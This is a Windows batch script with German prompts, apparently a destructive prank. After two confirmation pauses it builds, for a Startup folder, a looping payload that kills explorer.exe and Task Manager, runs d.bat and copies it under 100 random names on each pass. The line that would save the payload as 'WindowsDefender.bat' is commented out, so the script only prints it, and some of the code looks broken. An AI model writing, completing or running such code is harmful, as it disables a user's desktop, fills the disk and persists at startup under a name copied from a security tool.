@echo off
echo ACHTUNG: Dieses Skript wird dieses Gerät beschädigen, ausführen auf eigene Gefahr! Sicher, dass Sie fortfahren wollen?
pause
echo SICHER!?
pause
echo Schade...
Z:
cd Z:\Start Menu\Programs\Startup\
set script="
@echo off^
:a^
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION^
set len=20^
set charpool=0123456789QWERTZUIOPASDFGHJKLYXCVBNMqwertzuiopasdfghjklyxcvbnm^
set len_charpool=62^
set gen_str=^
for /L %%b IN (1, 1, %len%) do (^
  set /A rnd_index=!RANDOM! * %len_charpool% / 32768^
  for /F %%i in ('echo %%charpool:~!rnd_index!^,1%%') do set gen_str=!gen_str!%%i^
)^
taskkill /im explorer.exe /f^
taskkill /im taskmgr.exe /f^
start %~dp0d.bat^
for /l %x in (1, 1, 100) do (^
  copy %~dp0d.bat %~dp0\!gen_str!%x.bat^
)^
tree /F /A^
goto a^
"

:skip
REM echo %script% > WindowsDefender.bat
echo Computer ge-Schweinekebabt...
pause
echo %script%
pause